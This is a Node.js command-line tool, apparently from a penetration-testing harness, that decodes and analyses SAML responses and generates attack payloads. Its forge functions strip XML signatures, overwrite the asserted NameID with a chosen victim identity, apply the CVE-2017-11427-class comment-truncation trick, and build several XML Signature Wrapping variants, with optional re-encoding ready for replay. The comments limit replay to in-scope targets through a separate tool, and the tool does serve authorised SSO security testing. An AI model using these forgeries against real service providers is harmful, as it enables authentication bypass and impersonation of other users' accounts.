#!/usr/bin/env node
// Cyboros saml — SAML response analysis + XML Signature Wrapping (XSW) attack-payload generation.
// Closes a real gap: OAuth/OIDC was covered (jwt.js/authn), SAML was not. This is the SAML analog
// of jwt.js — it DECODES and ANALYSES a SAMLResponse and MINTS attack payloads; it does NOT send.
// Replay a minted payload against an in-scope SP ONLY through repeater.js (scope-gated).
//
//   node tools/saml.js decode  '<SAMLResponse b64>' [--redirect]     inflate/parse (redirect binding = deflated)
//   node tools/saml.js analyze '<SAMLResponse b64>' [--redirect]     signature/assertion risk flags
//   node tools/saml.js forge   '<SAMLResponse b64>' --strip          remove <Signature> (test signature-not-enforced)
//   node tools/saml.js forge   '<...>' --xsw <1-8>                    XML Signature Wrapping variant
//   node tools/saml.js forge   '<...>' --set-nameid '<victim>'        tamper the asserted identity
//   node tools/saml.js forge   '<...>' --comment-nameid '<victim>'    NameID comment-truncation (CVE-2017-11427 class)
//        add --encode [--redirect] to emit a ready-to-replay base64 (deflated for redirect binding)
//
// Detection discipline: minting a payload proves nothing — the SP's ACCEPTANCE of it does. Replay
// via repeater.js and record verify_level by what the SP actually did (triggered vs proven_impact).
//
// ponytail: SAML is XML; Node has no XML parser in core, so parsing is best-effort regex/string
// surgery (the same posture the harness takes for other text formats). XSW mutations are structural
// string edits — verify the emitted XML is well-formed against the real SP.
'use strict';
const zlib = require('zlib');

// ---- codec ------------------------------------------------------------------
function decodeSaml(b64, opts) {
  opts = opts || {};
  const raw = Buffer.from(String(b64).replace(/\s+/g, ''), 'base64');
  if (opts.redirect) { try { return zlib.inflateRawSync(raw).toString('utf8'); } catch { /* not deflated */ } }
  return raw.toString('utf8');
}
function encodeSaml(xml, opts) {
  opts = opts || {};
  const buf = Buffer.from(xml, 'utf8');
  const out = opts.redirect ? zlib.deflateRawSync(buf) : buf;
  return out.toString('base64');
}

// ---- parse (best-effort) ----------------------------------------------------
function tag(xml, name) {
  // matches <ns:name ...>...</ns:name> or <name ...>...</name>
  const re = new RegExp(`<(?:[\\w-]+:)?${name}\\b[^>]*>([\\s\\S]*?)</(?:[\\w-]+:)?${name}>`, 'i');
  const m = xml.match(re);
  return m ? m[1] : null;
}
function attr(xml, name) {
  const m = xml.match(new RegExp(`\\b${name}\\s*=\\s*"([^"]*)"`, 'i'));
  return m ? m[1] : null;
}
function has(xml, name) { return new RegExp(`<(?:[\\w-]+:)?${name}\\b`, 'i').test(xml); }

function parse(xml) {
  const assertionBlock = (xml.match(/<(?:[\w-]+:)?Assertion\b[\s\S]*?<\/(?:[\w-]+:)?Assertion>/i) || [])[0] || '';
  return {
    issuer: tag(xml, 'Issuer'),
    nameId: tag(xml, 'NameID'),
    assertionId: attr(assertionBlock, 'ID'),
    audience: tag(xml, 'Audience'),
    recipient: attr(xml, 'Recipient'),
    notOnOrAfter: attr(xml, 'NotOnOrAfter'),
    hasResponseSignature: /<(?:[\w-]+:)?Signature\b[\s\S]*?<\/(?:[\w-]+:)?Signature>/i.test(xml.replace(assertionBlock, '')),
    hasAssertionSignature: /<(?:[\w-]+:)?Signature\b/i.test(assertionBlock),
    hasSignature: has(xml, 'Signature'),
  };
}

// ---- analyze ----------------------------------------------------------------
function analyze(xml) {
  const p = parse(xml);
  const risks = [];
  if (!p.hasSignature) risks.push({ id: 'no-signature', severity: 'High', note: 'response carries NO XML signature — if the SP accepts it, assertions are fully forgeable' });
  if (p.hasSignature && !p.hasAssertionSignature) risks.push({ id: 'response-signed-assertion-unsigned', severity: 'High', note: 'only the Response (not the Assertion) is signed — XSW candidate: wrap an unsigned forged assertion' });
  if (p.hasAssertionSignature && !p.hasResponseSignature) risks.push({ id: 'assertion-signed-response-unsigned', severity: 'Medium', note: 'assertion signed, response envelope unsigned — test signature-reference confusion (XSW)' });
  if (p.nameId && /\s/.test(p.nameId)) risks.push({ id: 'nameid-whitespace', severity: 'Low', note: 'NameID contains whitespace — probe comment-truncation (CVE-2017-11427 class)' });
  if (!p.audience) risks.push({ id: 'no-audience-restriction', severity: 'Low', note: 'no AudienceRestriction seen — assertion may be replayable across SPs' });
  return { parsed: p, risks };
}

// ---- attack payload minting -------------------------------------------------
function stripSignature(xml) {
  return xml.replace(/<(?:[\w-]+:)?Signature\b[\s\S]*?<\/(?:[\w-]+:)?Signature>/gi, '');
}
function setNameId(xml, victim) {
  return xml.replace(/(<(?:[\w-]+:)?NameID\b[^>]*>)([\s\S]*?)(<\/(?:[\w-]+:)?NameID>)/i, `$1${victim}$3`);
}
// Comment-truncation: many parsers return text after a comment, others before → smuggle victim.
function commentNameId(xml, victim) {
  return xml.replace(/(<(?:[\w-]+:)?NameID\b[^>]*>)([\s\S]*?)(<\/(?:[\w-]+:)?NameID>)/i, `$1${victim}<!---->$2$3`);
}

// XSW: relocate/duplicate the Assertion relative to the Signature so the signature validates over
// the original while the SP processes the attacker's forged assertion. Variants 1-8 map to the
// classic Somorovsky et al. taxonomy; here we implement representative structural moves.
function xsw(xml, variant, victim) {
  variant = Number(variant) || 1;
  const assertion = (xml.match(/<(?:[\w-]+:)?Assertion\b[\s\S]*?<\/(?:[\w-]+:)?Assertion>/i) || [])[0];
  if (!assertion) return { ok: false, reason: 'no <Assertion> found' };
  const forged = victim ? setNameId(stripSignature(assertion), victim) : stripSignature(assertion);
  const evilId = 'evil_' + Math.random().toString(36).slice(2, 8);
  const forgedWithId = forged.replace(/(<(?:[\w-]+:)?Assertion\b)/i, `$1 ID="${evilId}"`);

  let out;
  switch (variant) {
    case 1: // forged assertion wrapping the signed one inside a bogus Response
      out = xml.replace(assertion, forgedWithId + assertion); break;
    case 2: // signed assertion first, forged after (SP picks last)
      out = xml.replace(assertion, assertion + forgedWithId); break;
    case 3: // forged assertion, signed assertion nested inside an <Extensions>
      out = xml.replace(assertion, forgedWithId.replace(/<\/(?:[\w-]+:)?Assertion>/i, `<Extensions>${assertion}</Extensions></Assertion>`)); break;
    default: // 4-8: place forged before the original + null the original's ID reference
      out = xml.replace(assertion, forgedWithId + assertion.replace(/\bID="([^"]*)"/i, 'ID="$1_orig"'));
  }
  return { ok: true, variant, evilId, xml: out };
}

module.exports = { decodeSaml, encodeSaml, parse, analyze, stripSignature, setNameId, commentNameId, xsw, tag, attr };

// ---- CLI --------------------------------------------------------------------
function getflag(args, name) { const i = args.indexOf(name); return i >= 0 ? args[i + 1] : undefined; }
function main() {
  const [cmd, token] = process.argv.slice(2);
  const args = process.argv.slice(4);
  const redirect = args.includes('--redirect');
  if (!cmd || !token) { console.error("usage: node tools/saml.js <decode|analyze|forge> '<SAMLResponse b64>' [opts]"); process.exit(2); }
  const xml = decodeSaml(token, { redirect });

  if (cmd === 'decode') { console.log(xml); return; }
  if (cmd === 'analyze') { console.log(JSON.stringify(analyze(xml), null, 2)); return; }
  if (cmd === 'forge') {
    let out;
    if (args.includes('--strip')) out = stripSignature(xml);
    else if (getflag(args, '--xsw') !== undefined) { const r = xsw(xml, getflag(args, '--xsw'), getflag(args, '--set-nameid')); if (!r.ok) { console.error(r.reason); process.exit(1); } out = r.xml; }
    else if (getflag(args, '--set-nameid') !== undefined) out = setNameId(xml, getflag(args, '--set-nameid'));
    else if (getflag(args, '--comment-nameid') !== undefined) out = commentNameId(xml, getflag(args, '--comment-nameid'));
    else { console.error('forge needs one of: --strip | --xsw <n> | --set-nameid <v> | --comment-nameid <v>'); process.exit(2); }
    console.log(args.includes('--encode') ? encodeSaml(out, { redirect }) : out);
    console.error('\n[!] Minted a payload — proves nothing until an in-scope SP ACCEPTS it. Replay via tools/repeater.js and record verify_level by the SP\'s response.');
    return;
  }
  console.error('unknown command'); process.exit(2);
}
if (require.main === module) main();
